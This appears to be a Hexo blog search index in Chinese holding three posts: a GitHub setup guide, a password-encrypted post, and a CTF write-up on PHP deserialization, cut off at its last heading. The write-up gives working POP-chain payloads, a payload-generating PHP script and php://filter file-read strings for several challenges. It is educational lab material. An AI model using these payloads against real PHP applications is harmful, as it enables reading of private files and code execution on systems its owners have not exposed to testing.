<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>github使用</title>
      <link href="/2021/10/02/github%E4%BD%BF%E7%94%A8/"/>
      <url>/2021/10/02/github%E4%BD%BF%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<p>​    在学python的时候顺便学了些GitHub的使用，写个文档防止忘了</p> <span id="more"></span><p><strong>绑定用户</strong></p><p>打开git-bash</p><p>填写用户名和密码</p><p>提示（配置的帐号名和邮箱一定要与GitHub相同，不然会提交失败）</p><pre class="language-none"><code class="language-none">git config --global user.name &quot;@@@&quot;     (GitHub相对应的帐号名称)git config --global user.email &quot;123@163.com&quot;  （GitHbu相对应的邮箱帐号）</code></pre><p><strong>设置ssh key</strong></p><p>生成ssh key</p><p>首先检查是否已生成密钥 cd ~/.ssh，ls如果有3个文件，则密钥已经生成，id_rsa.pub就是公钥</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pbWcyMDE4LmNuYmxvZ3MuY29tL2Jsb2cvNzc0ODI0LzIwMTkwNy83NzQ4MjQtMjAxOTA3MTExNDU0MTYwMjAtOTMyNTYwNjcxLnBuZw?x-oss-process=image/format,png" alt="img"></p><p> 如果没有，输入: ssh-keygen -t rsa -C &quot;你的邮箱&quot;</p><p>复制ssh key</p><p> 方法1: 输入 clip &lt; ~/.ssh/id_rsa.pub   会自动复制ssh key，可以直接粘贴</p><p> 方法2:在c/Users/Administrator/.ssh/id_rsa)文件找到直接复制</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pbWcyMDE4LmNuYmxvZ3MuY29tL2Jsb2cvNzc0ODI0LzIwMTkwNy83NzQ4MjQtMjAxOTA3MTExNTA5MzI2MTItMTQ3ODE2MTQ3NC5wbmc?x-oss-process=image/format,png" alt="img"></p><p>连接github，打开GitHub 进入setting找到ssh key并新建</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pbWcyMDE4LmNuYmxvZ3MuY29tL2Jsb2cvNzc0ODI0LzIwMTkwNy83NzQ4MjQtMjAxOTA3MTExNTIwMTc5MTItMTY1MTYwMzY3My5wbmc?x-oss-process=image/format,png" alt="img"></p><p>然后测试连接是否成功</p><p>输入: ssh -T <a href="mailto:&#103;&#105;&#x74;&#x40;&#x67;&#x69;&#x74;&#104;&#117;&#98;&#46;&#x63;&#x6f;&#x6d;">&#103;&#105;&#x74;&#x40;&#x67;&#x69;&#x74;&#104;&#117;&#98;&#46;&#x63;&#x6f;&#x6d;</a> </p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pbWcyMDE4LmNuYmxvZ3MuY29tL2Jsb2cvNzc0ODI0LzIwMTkwNy83NzQ4MjQtMjAxOTA3MTExNTI1MDg3MzYtNDUwMTA1MTMwLnBuZw?x-oss-process=image/format,png" alt="img"></p><p><strong>上传</strong></p><p>上传的基本步骤就是这样了</p><p>先打开一个文件夹按着图片里的步骤来</p><p>先初始化再把想传的文件传上去</p><p>可以用git add .上传所有文件</p><pre class="language-none"><code class="language-none">注：输入git add .后如果报错warning: LF will be replaced by CRLF in gradlew.The file will have its original line endings in your working directory则再输入git config --global core.autocrlf false后再重新输入git add .命令即可</code></pre><p>git commit添加备注</p><p><img src="/2021/10/02/github%E4%BD%BF%E7%94%A8/image-20211002123234287.png" alt="image-20211002123234287"></p><p>克隆仓库</p><pre class="language-console" data-language="console"><code class="language-console">$ git clone 网址 [自定义目录名]</code></pre><p>可以用https://或git://或ssh传输协议</p><p>查看连接的仓库地址</p><pre class="language-none"><code class="language-none">git remote -v</code></pre><p>如果在另外的文件夹提交需重新进行一遍图中步骤</p><p>还要再push前输入</p><pre class="language-none"><code class="language-none">git pull --rebase origin main</code></pre><p>该命令的意思是把远程库中的<strong>更新合并</strong>到（<strong>pull=fetch+merge</strong>）本地库中，<strong>–-rebase</strong>的作用是取消掉本地库中刚刚的commit，并把他们<strong>接到</strong>更新后的版本库之中。出现如下图执行pull执行成功后，可以成功执行git push origin main操作。</p><p>否则就会因为本地库与远程库不一致导致报错</p><p><img src="/2021/10/02/github%E4%BD%BF%E7%94%A8/image-20211002130237512.png" alt="image-20211002130237512"></p>]]></content>
      
      
      
        <tags>
            
            <tag> 随笔 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>总结</title>
      <link href="/2021/08/31/%E6%80%BB%E7%BB%93/"/>
      <url>/2021/08/31/%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="ffd9c9e08dfff4fd480ba495218c7b14b64e222952af7a224df5cc34e192d835">d55db17c59acd0a076373f5618149936d6336804120d7706b0bd474d7690c83560f5b1a2978403e63d06e384fd2b3216f60ffceb2be10fe923607ba2a3f63da85fd573465ac20bc125e6bb8bb1c28a489ff55a1e83e31b1f21e5995be8e82e6f0e3e1f2a7f096112e33c5dfce9833b992faa1c4e10ff5a0a9ccd52a84a150704eb1d076e0dfca78b1af85df4103072dbdad529e8fc7c86c857ed238118aec3cd58ccf74191fd7cf63146683436a8dc292c9c1aa4e1293f565128508c73309a180251762668ee2acf55e0c5fcd1478c07ab872c65499ff133a0fc60824a24b39a9e1e76f2c69874f326569a2b84a61395be62fc234a4b06e957de549e33978fa9174fdf487317891d129c15b4d5631bc72e0ef7b7caf952f7c1be0fd78cc21266c0964d88376b616be4a4a48141bf1da81a82ce89afcfa404bf64910f0f37a39937cd5838ce215ee3f97a2cea4d4be7e56ec01704c03a484f2ab5b88300bfd8c652af99b1f496cd0ae8c7737fbe277e8c9dc8c9a1a4487395b12b5b4eec720f72bed05d59cd60c823ef6135ac7d9da881babc997440ca539fa9c327f0617825d682f750a2b7aefcdf650b68536157c491e7b226348d7ab587c3abfb979bf95ae76045440a2fdfe35fbb4686ec7054384045b4dfe31e0f4c91bc639266733d111158c9c02a8d6ca4c47ba35801ed7cf6024a4c881c3ad0078fb51e03524fcc2b03a6e2c53eac0dfb02117a31021783e20c28a6e29d70c30a7db799974fd02a43a0b875e90c4133c27a16de1c97456e4dacc497695df80a02aac76337157c6b5a632b7a8827d2f93e7194926118c8b946329d2394aafbe0350775016fea7d2d894a0cc0076f5d04a87789718e640910dd57af5d5231ef8a0bc4979f0303fbcd0e95d91fd702140ab950854d2561942ba149fea0279b215d59b170ac2b2d70f36b55ef786acf81e93c63003deeafd0d907361016d471e49eeab2ff13e71c8ef2d558df0115525b8d79a3fce601848aca3f01bd9d04b528e1ac85afcb61581b74cfc92ec835f113ae1ec8e94190cf0ac58f1081efcdaad339ca4f7aa250ef91ed449bc2381106d1c6411fa0a21c2f668be2ef1b2e1ce63391db27b7cb34ccacca3067c3233d22bda5e8d5df63061a607813d8af9ffa7b8194f17da312afd2f2f9fd6fe19f91ddb7766c5e3a47cae6be48f2bcb9a0e445a7948b17bc75d5f8c2cf97364cac5d5dedce9742313b1da92ddb9be1a7b14b4e3c82b47f3e3a4712d1ebaa5002bae95210119a3a253fa3f7d27c5f65f40ba45f7a173db94682820c2894045d0a621052da37a7ac85b8aa18b7faf0698663b42466b9a0c3fa430f9c5f958aa86cef627c344ecd2632c5ae926cd6d32029d760a1fe4e502606626e6392ed896bc1d942dac360a1bbe79221bbaa8752f38a6ebdefbe3ad7d6ef71a0e4fdd1d32588f3f48b99e6de194f570606a5b5216d5ef5e5c346234abaf6ffa2d06735981616196b65b364724d5635df55c702efe0724d3e4fb14e668d6b393909f47b8d57cf493ff11338d61348acfc55e763707c25000ed081aab07a047a1b3a09fd7b0b50597b642fa07974854dba9eba5f9c1230e7f53a0e88cbc688a573c69ef18c6c81aea22b5716fcc3e3923efd6fe1e5df2dc086dfb25abfa1291464a0105d3258d8786de15f571bdea6ce04891f73e9e440ca5b7b2c348b07cc755f4ec0ea22f60e4cf98ad9e66f4f2bbdc7fdae6e3c04e5f1e36880a9777e3813fda0cc8ea91eb1cb8fd690365aa3f8a0f3b76b2595c9c0ebe85d61b5b78ad4d0d65329682b13a20ea49a352776edf2f6ac98befb0aa4c31748a074935bfee7cf338fcc83d32731eec5c3cc95e6007c915a2b889ee89892f1bfc4293a5af02ac9ea89444789d9b865ce10adf39d16e27b427cd156b21c33802fea6e31350eec46ee9b200ad661d8b35dc3c82b656276e1b514ff922bfd8614c1bb5183e61567843ba22a3b96eaac46b4dd7d4e577a19023c1a026a026d00938c6616b52ced4e30a316dccd8da25bc4868815bf0da6d1009aedf68fb84052cc4a41bc727edcb067ef30ce477e9ca495ec0b74bc0e1954837d1fc704fb6190046dbb7c03667097ce7c1294b6f8af7d78b94db3388cd38aee78ff192a22418a10d2b508ba99b16c79944c2a3b06b7e8f3c483ee9b5c3323c32ae4c35ce11cc5b3cefc54d403d296f0c4b5f18456d09c6ee7e416f94b59096bdde6f6211a7e8fdbcac037514ab4aefe6b224ed89b4bb54f117e4b1e31bcdc3221c0b18aae0f1c6b950f551c420a27c244411f9b53814a4a4b6d9b8091f2752473260463ba74902c57f37d7f9294ea80a4cd1b486de9b036b9d958a32bf0192016154ff3edadc941b9875a0c6fe523d280cb92dd046284725f121768bc1595c33307a68674fbb4672d8ecc47d91d9595b6297d9787473fa6664341e5245cc287d83136023bf3d2dd20fa5ac868a7d59c905f493dedf391d2364e4648922399e0033861089d651876495474a8ab77cae12c68144909da9045c53097cdadd94c3ab0cff1bbb9c3e9ea0758680aaf972cf805bdb7e41b1c0ac31a038f1668639dc6975f2416f2b313c02821ed944e0388d9dbbffa6ed68cb3a68a00e0674412ab70a289111a122c2ecb6aef8e6f2ec3d1e29923b03dd3c7f3ce80d166ccfff9d0947f8db82deff84ac44fd53206386d38f1a5f975897653f5ac4f87e8bb5ce530b56f856ca0d54685cd25c9c735c79974e0c9c960a41ee1f1be6189f326615c01bc9b1d3cc6c55a26e590255074e1b09ab1a143f7a3a17bd2f24b25179e0b58f823c5166e92f6806c2d0d02021332ff37d02ac2adbaccbb7da58268243129723099ac57bde170bf8875027156513afc0dbc4eddf52f41e552a3e5675ca79a1fabf8382e7efa59081497260e6c9c300ec66df8bdcc5d067eade89cdb5dbe9dc48865ccfbb24f7cfdfedd08f86cf5894a08b7cd72884f2a618f184a14ff7c9227024feab937b9895a6189867b87345b5e809a6b16dec3a687bdd940396cead1cdb45e29128ed2dd307ed2114912643233bfb1a0d30a4d0c24a9cac5f66b8654239a16066bc429b7db7cc3c119e72cb6de9932b11e744dabb319dbc14153e656f399a6442e48a1d34d3c857338e8922f383dbeedcd09499c20f4ad881385939ca4ff4ce532b01ded8d399a9cb1d15a3a30d55d0d10d5f9e435237943cbb0362323fd9c9c92faae198984e23af277d044e8753a723c5bae8e5717d079463a1db22706810f29cd02c652b8c3a70dab5f936850e7b8c47bbe1aa5ce90765a673419fb09a0f8c30313d08ecedc65bc38844dcea3bdd6a312964981755eadec3c69b346a7381ecf2edddb05f53baeb812869d49da7a528d253750368c1edd96054bbbbdafdf026b86d18b5ac9c52016e3cf10fa30be7a25358f5a8a4746ae3abf8e8ca561f9a51bd9784fae192bbe241d5c45c2ea947828907d66f8f11e3055c2534ff97d3943584484bfa74c2ff6fdccfd370a4e3a7b626772c712a4579b25de04b7b9ae17d789b21d7986549ca4c2b3776ce4b89ef5a236a0f6232e22a5c07bb759f5d5731923805638fac6095fb26501d432f5bad82cde0b51ffdc07db857a28d8b20267226a264c8c9c3b2d9dc22753f6578d96e38009eb649b71efee06b8fd4820e81e5ead8a35b074a0c68edf446c636fec1ceeb6583f878b7592adba15b97966f0a53ddff9e5f244e18b66e7fe272a9647d02df6b1b69a3ecbfa479925c2df4097815ddbd0f01ccf4fad46cd80b828418e2497d03170f7f6543afcb583eb5e71412b51e271b9864c9257c328ab854597c5b4e87d8423ea629bc5a03ba4fc2c1064feeaeb42f9c2f2bf86ce675112bd1bdc0b240948e5d971a8e801b5cfac35055aec7164ce761ab6aa7695344ed74ade33bd3baab72dbb2d08ba1368f3f690070d4ad0193a9ee99fad03251ad0e0b5a89c5de47ec4ed4a3f369251adc81268e96d6cd1b70ba493da73c093b3d50c55f0d13057c4ad81027679e951977025f8b4894ca6b4ea2d531a80b90bbbd4239c2dd9664b9380108dbbf6e325ba43446fb22eb44f7162f28385cce97ad2e2be5ab9c04bf0760b68116ca8e426144bf65067ad0d32f3ebe7ce99f3bd1c7a5e012419c924f43b6b6adb254f8f3d9b1b1b6a34289f886b17fce3bd72d96a1d27ae6eebdee467229625d95addce349a05d1acb4868c709753f40afd471ada2275adcd13cadef74f60945ff7e14003331931872fd36d0c5a3c106f5a05178eb2749b37b88735ad9ed880e575d98c3cc8324804022e2c47cfd53498d1bbcc228ebada27dfed15178d79256e72b8b4f4eadd585191760cbd2e65982a03b551fd4111d6a1aa36c077fec077e2793a789b5e546abe46797242f07257d2846e34239a0c0ca53069ea93534ee05fd533f8e5b4d303b343fcb334c153f07b5f02c59e676f56d580cd7f2dc192d36cf05da6b54b88fe3e6633ab421a44c2d10cd64292ec2620984413e560b6488f699c429cddf4d27cd725e3448d3b3e88faaf6f1071a32fa834a28809205f6851c659d59666e028f198588219a89a9bafdf21e680b7524ba1ecb290bcd9ad123b9b157bf33207890c232d6d42c604245f85b2133db4de26ec9e3d5be49ada1141134941e35b823d9b2c258dca278b928c92647c5bd5bd8750066ce3887b53cdebf896c84bdf7ed95cbcbc8025da38b5fd1c144c211faf4c499ce6b581615ad52ca3d750fe8b1f3cae99556f532e4070634f21e43050437997c2396fe046ab7ff5bf685982bba3b089941ad0075cd2447c5d0853791e3ab52468618d854df63699bd70a372451062efaaef3e5d71afc522c63b5100d850e7e58f339418d905995afc0b31448c23c24f8d1f413132680bb0eaaf5cebf266b6e111642acf40f20c947b1cad79eed227a74a09f4d8e221e02b12b498c97bef2f058366ee18013bba67c8742c649c110c470583b14407ab23ad683bb9a906e3fc04e10fd8e6d4f3b374f51cf71eff7f013d5fc72ce324d66ac11189583ca51b6ba0f27c3751af963e059a6fbfd56e039937bc683bd727f01a5491cb5ccc4deaa999ea0c65e894a07408a56d7a3c8fdc921eafaa5a35ab57c5ccc2148cc20c2718a621be7a034b33df4383f74aeee117596296c7a98f07f7d8a1a51a225559e340ff4fbe3b5f5a4b27a465a5042a07a09c0fcf4a2b1f0fe9d3f53b250629e05ce5a9e9636f99ef6a1c232d851d183962202649bb62c8aabaaf936725737cf41d08ca55818a8cb0e90b887f42b59f4dd36384b3dc89694be37446d87a33f9df70c4e8693214bac2458a13d189657050e874f41a8371762ff3ff79f43054c7e971e9ae589e678cff12d9dc1b84349947f81c90191a2c50e0aee059eebe26efaac8790c145aeffc9415b941b8b528d00b4aeaec4e023805c53b9c5ed0fd64e74f8998562f81686f595f084dfb33ad1a7493081982a9160893e6d3ada4c374d03b9ec8c57d07d629f8b25e7c6db5815b35be32d98227f8d52a34b739deeb70bec4bc56b404ed8ae2bb684f77f3d96f1871aac794d91dfdd086224a78221a1372b8eb23c302cdc4310f07b279ad051f95ed68f9b8e490cb7373eebd7b7e9ece4d17ac5a48035c35c6bc40cfb8b52cbac5cab239ebed9cb7157bda70608bfd969ede6ff26c9f15b253b9270bab85485053b7b87522e7dbfec76772af82eee476ee974ea6996a940f59b274cb8b3d9341793e467013b4f034e2a28e751c6db19bde2611576249b663b147fd9f6dd2a131f0053a7d93ecf29111d77158927c0b1cdef6a05d5224e89852a32c8a1a4434f01d7718cc79866c1069225b62583421e24597866e8c0ccbc110c9bc6d9a104817464235289cf4d9c1e944be6087e6c334fdb97bc7171f66dbb0304bd25d89df51e3f36b2fe6159a0e639d933a491010bbc2be35dec8d535c7f99760066d7c44d9c0036b81c08e462c0be4c7511641b0a26808cc1a861abde94e2e47a30361c9d77e81214f494bd0253173a803364751b7460297b646e4b2c47f026dc5bc59e17fbb990ff569d2d320b9ca819463e14748304c262a26bb1b8103205c546bdca2ae18e6843bfa12aa828145d6ac6fa47c86c3ebc9f9f82f074759ad43217c2ad6e7df4498c55f2da565b19930528b7bb2348debc26ee061d718b6f8d78a9024c77e9f2b647094f70750166b1996e450179a653ab416cbace25cafcf2dd480e44beeec1aaf6038c8c03d7d5858a1c4dd495ff2bdeccffe946e78430dff6e7168cd349e9d44c9bc35f0bf9434cbb330cbc74d8fa142199486aec3a2d920d537339f476a07de47b81c4423df3b69beeee7479097a1f953b224d3407d96c840f904968fc556b5db69c149be41edca5ac4c34bc1f47a73616d3c3b67b5541ac9b411dcaa2cdbe3d90e15db1161a3f2ff6d50861588c3f58567d3a78d24bd951d76945a539cb25e8bb9f84a71600bee2bc9736412c2b41884426ec27bc9ef560b57a356f83242506a432a2c66f945d95be430462f57a1518ab2f2ec206a1469c76e86908cfa37e75e701eb8013e3957324d704ae797fadb747f3f9b5b97bc8f53938548b06d6b5347b7df163222926d71d426f8c03ee3149f95dbda8a2f1c3ed01a07228287e9944aa6a43386b098e91bdadf3fc5384bd1ee1e7ccb1da58a01ec07cbaaa2162ea6686c6654cc1ec73e1c57026f111e433dec6e2435e4a1b04128a20903d28e643961d054850af45a8c326709d52002eb3a691b9a90974e9f22c4d002a3ea03edd8b55f8aae9d08825fd0c6ae793ef1ae384d13c87be8dce8fa25cb07582c47cf677fafae9d4e92b5be1ecb6466</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">猜猜看</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      
        <tags>
            
            <tag> 随笔 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>反序列化</title>
      <link href="/2021/06/30/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
      <url>/2021/06/30/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
      
        <content type="html"><![CDATA[<h3 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h3><p>php的序列化和反序列化主要是通过serialize和unserialize两个函数</p><p>serialize()将一个对象转换成一个字符串，unserialize()将字符串还原为一个对象，对反序列化进行利用也主要是通过其中的魔术方法</p> <span id="more"></span><p>几个常见的魔术方法</p><pre class="language-none"><code class="language-none">__construct： 在创建对象时候初始化对象，一般用于对变量赋初值。__destruct： 和构造函数相反，当对象所在函数调用完毕后执行。__toString：当对象被当做一个字符串使用时调用。__sleep:序列化对象之前就调用此方法(其返回需要一个数组)__wakeup:反序列化恢复对象之前调用该方法__call:当调用对象中不存在的方法会自动调用该方法。__get:在调用私有属性的时候会自动执行__isset()在不可访问的属性上调用isset()或empty()触发__invoke()当尝试把对象当方法调用时调用。__unset()在不可访问的属性上使用unset()时触发</code></pre><p>格式</p><pre class="language-none"><code class="language-none">O:4:&quot;Test&quot;:2:&#123;s:1:&quot;a&quot;;s:5:&quot;Hello&quot;;s:1:&quot;b&quot;;i:20;&#125;类型:长度:&quot;名字&quot;:类中变量的个数:&#123;类型:长度:&quot;名字&quot;;类型:长度:&quot;值&quot;;......&#125;</code></pre><p>序列化字符串中表示对象属性个数的值大于真实的属性个数时会跳过__wakeup的执行</p><p>private类型有隐藏的空格符</p><p><strong>反序列化的常见起点</strong></p><p>__wakeup 一定会调用</p><p>__destruct 一定会调用</p><p>__toString 当一个对象被反序列化后又被当做字符串使用</p><p><strong>反序列化的常见中间跳板:</strong></p><p>__toString 当一个对象被当做字符串使用<br>__get 读取不可访问或不存在属性时被调用<br>__set 当给不可访问或不存在属性赋值时被调用<br>__isset 对不可访问或不存在的属性调用isset()或empty()时被调用。形如 $this-&gt;$func();</p><p><strong>反序列化的常见终点:</strong></p><p>__call 调用不可访问或不存在的方法时被调用<br>call_user_func 一般php代码执行都会选择这里<br>call_user_func_array 一般php代码执行都会选择这里</p><h3 id="POP链简介"><a href="#POP链简介" class="headerlink" title="POP链简介"></a><strong>POP链简介</strong></h3><p>借鉴的文章：</p><p><a href="https://www.jianshu.com/p/16c56bebc63d">php反序列化利用——POP链构造实例 - 简书 (jianshu.com)</a></p><p><a href="https://blog.csdn.net/qq_43431158/article/details/105265462">(1条消息) PHP反序列化—构造POP链_Lemon&#39;s blog-CSDN博客_php反序列化pop链</a></p><p>POP 面向属性编程(Property-Oriented Programing) 常用于上层语言构造特定调用链的方法，与二进制利用中的面向返回编程（Return-Oriented Programing）的原理相似，都是从现有运行环境中寻找一系列的代码或者指令调用，然后根据需求构成一组连续的调用链,最终达到攻击者邪恶的目的。类似于PWN中的ROP，有时候反序列化一个对象时，由它调用的__wakeup()中又去调用了其他的对象，由此可以溯源而上，利用一次次的“gadget”找到漏洞点。</p><h3 id="POP链利用技巧"><a href="#POP链利用技巧" class="headerlink" title="POP链利用技巧"></a>POP链利用技巧</h3><p>1、一些有用的POP链中出现的方法：</p><pre class="language-php" data-language="php"><code class="language-php">- 命令执行：exec()、passthru()、popen()、system()- 文件操作：file_put_contents()、file_get_contents()、unlink()</code></pre><p>2、<strong>反序列化中为了避免信息丢失，使用大写S支持字符串的编码。</strong>PHP 为了更加方便进行反序列化 Payload 的 传输与显示(避免丢失某些控制字符等信息)，我们可以在序列化内容中用大写S表示字符串，此时这 个字符串就支持将后面的字符串用16进制表示，使用如下形式即可绕过，即：</p><pre class="language-css" data-language="css"><code class="language-css"><span class="token property">s</span><span class="token punctuation">:</span>4<span class="token punctuation">:</span><span class="token string">"user"</span><span class="token punctuation">;</span> -> <span class="token property">S</span><span class="token punctuation">:</span>4<span class="token punctuation">:</span><span class="token string">"use\72"</span><span class="token punctuation">;</span></code></pre><p>3、深浅copy：在 php中如果我们使用 &amp; 对变量A的值指向变量B，这个时候是属于浅拷贝，当变量B改变时，变量A也会跟着改变。在被反序列化的对象的某些变量被过滤了，但是其他变量可控的情况下，就可以利用浅拷贝来绕过过滤。<br> 4、配合PHP伪协议实现文件包含、命令执行等漏洞。</p><h2 id="wp"><a href="#wp" class="headerlink" title="wp"></a>wp</h2><p>先贴俩之前写的简单的</p><h3 id="ZJCTF-2019-NiZhuanSiWei"><a href="#ZJCTF-2019-NiZhuanSiWei" class="headerlink" title="[ZJCTF 2019]NiZhuanSiWei"></a>[ZJCTF 2019]NiZhuanSiWei</h3><p><img src="/2021/06/30/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20210501204543745.png" alt="image-20210501204543745"></p><p>看见file_get_contents(),利用伪协议data://text/plain;base64绕过</p><p>再利用php://filter读取useless内的内容</p><p>解码后</p><p><img src="/2021/06/30/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20210501183046395.png" alt="image-20210501183046395"></p><p>可知flag在flag.php中</p><p>试图让file=flag.php</p><p>看到unserialize函数，利用php反序列化</p><p>构造payload</p><p>？text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=&amp;file=useless.php&amp;password=O:4:&quot;Flag&quot;:1:{s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;}</p><p><img src="/2021/06/30/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20210501205224647.png" alt="image-20210501205224647"></p><p>查看源码找到flag</p><p><img src="/2021/06/30/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20210501205239104.png" alt="image-20210501205239104"></p><h3 id="极客大挑战-2019-PHP"><a href="#极客大挑战-2019-PHP" class="headerlink" title="[极客大挑战 2019]PHP"></a>[极客大挑战 2019]PHP</h3><p>页面中提示有备份文件，御剑扫一遍</p><p>找到存在<a href="http://www.zip/">www.zip</a></p><p><img src="/2021/06/30/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20210501220739803.png" alt="image-20210501220739803"></p><p>重点在class.php和index.php中</p><p><img src="/2021/06/30/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20210501220822144.png" alt="image-20210501220309908"></p><p><img src="/2021/06/30/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20210501220857753.png" alt="image-20210501220857753"></p><p>所以要传入一个select参数，利用反序列化让username=admin</p><p>password=100</p><p>因为username和password两个为private类型</p><p>所以有隐藏的空格符</p><p>select=O:4:&quot;Name&quot;:3:{s:14:&quot;%00Name%00username&quot;;s:5:&quot;admin&quot;;s:14:&quot;%00Name%00password&quot;;s:3:&quot;100&quot;;}&quot;</p><p><img src="/2021/06/30/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20210501220212731.png" alt="image-20210501220212731"></p><h3 id="MRCTF2020-Ezpop"><a href="#MRCTF2020-Ezpop" class="headerlink" title="[MRCTF2020]Ezpop"></a>[MRCTF2020]Ezpop</h3><p>题目源码</p><pre class="language-php" data-language="php"><code class="language-php">class Modifier &#123;    protected  $var;    public function append($value)&#123;        include($value);    &#125;    public function __invoke()&#123;        $this-&gt;append($this-&gt;var);    &#125;&#125;class Show&#123;    public $source;    public $str;    public function __construct($file&#x3D;&#39;index.php&#39;)&#123;        $this-&gt;source &#x3D; $file;        echo &#39;Welcome to &#39;.$this-&gt;source.&quot;&lt;br&gt;&quot;;    &#125;    public function __toString()&#123;        return $this-&gt;str-&gt;source;    &#125;    public function __wakeup()&#123;        if(preg_match(&quot;&#x2F;gopher|http|file|ftp|https|dict|\.\.&#x2F;i&quot;, $this-&gt;source)) &#123;            echo &quot;hacker&quot;;            $this-&gt;source &#x3D; &quot;index.php&quot;;        &#125;    &#125;&#125;class Test&#123;    public $p;    public function __construct()&#123;        $this-&gt;p &#x3D; array();    &#125;    public function __get($key)&#123;        $function &#x3D; $this-&gt;p;        return $function();    &#125;&#125;if(isset($_GET[&#39;pop&#39;]))&#123;    @unserialize($_GET[&#39;pop&#39;]);&#125;else&#123;    $a&#x3D;new Show;    highlight_file(__FILE__);&#125;</code></pre><p>题目里出现的魔术变量</p><pre class="language-none"><code class="language-none">__construct   当一个对象创建时被调用，__toString   当一个对象被当作一个字符串被调用。__wakeup()   使用unserialize时触发__get()    用于从不可访问的属性读取数据#难以访问包括：（1）私有属性，（2）没有初始化的属性__invoke()   当脚本尝试将对象调用为函数时触发</code></pre><p>这里可以看出来首先要get进一个pop值，并进行反序列化，所以就会调用__wakeup()这个方法_</p><p>__<em>wakeup()中里利用preg_match对传入的值进行过滤，但如果this-&gt;source是show类，就会调用</em>__toString</p><p>这里会返回$this-&gt;str-&gt;source，但如果没有source这个属性，接下来就会调用__get()，然后会将对象调用为函数，</p><p><em>这里也就会触发</em>__invoke()，进而调用append</p><p>在append的中存在include，所以可以利用文件包含漏洞读到flag</p><p><img src="/2021/06/30/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20210704003613462.png" alt="image-20210704003613462"></p><p>payload</p><p>（自己写一个还是有点困难</p><pre class="language-php" data-language="php"><code class="language-php">&lt;?phpclass Modifier&#123;    protected $var &#x3D; &#39;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php&#39;;&#125;class Show&#123;    public $source;    public $str;    public function __construct($file)    &#123;        $this-&gt;source &#x3D; $file;    &#125;&#125;class Test&#123;    public $p;&#125;$a &#x3D; new Show(&#39;aaa&#39;);$a-&gt;str &#x3D; new Test();$a-&gt;str-&gt;p &#x3D; new Modifier();$b &#x3D; new Show($a);echo urlencode(serialize($b));</code></pre><p>base64解码拿到flag</p><p><img src="/2021/06/30/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20210704003713873.png" alt="image-20210704003713873"></p><h3 id="CODE-REVIEW"><a href="#CODE-REVIEW" class="headerlink" title="CODE REVIEW"></a>CODE REVIEW</h3><p><img src="/2021/06/30/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20210705135850186.png" alt="image-20210705135850186"></p><p>代码审计可以看出这里首先要先get进pleaseget=1然后post进pleasepost，md51，md52和obj四个值，而obj这里存在反序列化的漏洞</p><p>且当if($this-&gt;correct === $this-&gt;input)成立时就会打印出flag</p><p>这里同时要求传入的md51和md52的md5值相等，且自身不相等，由于md5不能处理数组，所以传入数组的返回值都为null</p><p>而因为$this-&gt;correct这里进行了编码，所以要使if语句成立在构造payload时可以采用引用赋值的方法</p><p>构造payload</p><p><img src="/2021/06/30/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20210705141338826.png" alt="image-20210705141338826"></p><p>//uniqid() :函数基于以微秒计的当前时间，生成一个唯一的 ID。</p><p>//传值赋值：变量默认总是传值赋值。那也就是说，当将一个表达式的值赋予一个变量时，整个原始表达式的值被赋值到目标变量。这意味着，例如，当一个变量的值赋予另外一个变量时，改变其中一个变量的值，将不会影响到另外一个变量。</p><p>//引用赋值：PHP 也提供了另外一种方式给变量赋值：引用赋值。这意味着新的变量简单的引用（换言之，“成为其别名” 或者 “指向”）了原始变量。改动新的变量将影响到原始变量，反之亦然。</p><p>所以最终payload为</p><p>get内容为：?pleaseget=1</p><p>post内容为：pleasepost=2&amp;md51[]=1&amp;md52[]=2&amp;obj=O:3:&quot;BUU&quot;:2:{s:7:&quot;correct&quot;;s:0:&quot;&quot;;s:5:&quot;input&quot;;R:2;}</p><p>拿到flag</p><p><img src="/2021/06/30/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20210705141616910.png" alt="image-20210705141616910"></p><h3 id="网鼎杯-2020-青龙组-AreUSerialz"><a href="#网鼎杯-2020-青龙组-AreUSerialz" class="headerlink" title="[网鼎杯 2020 青龙组]AreUSerialz"></a>[网鼎杯 2020 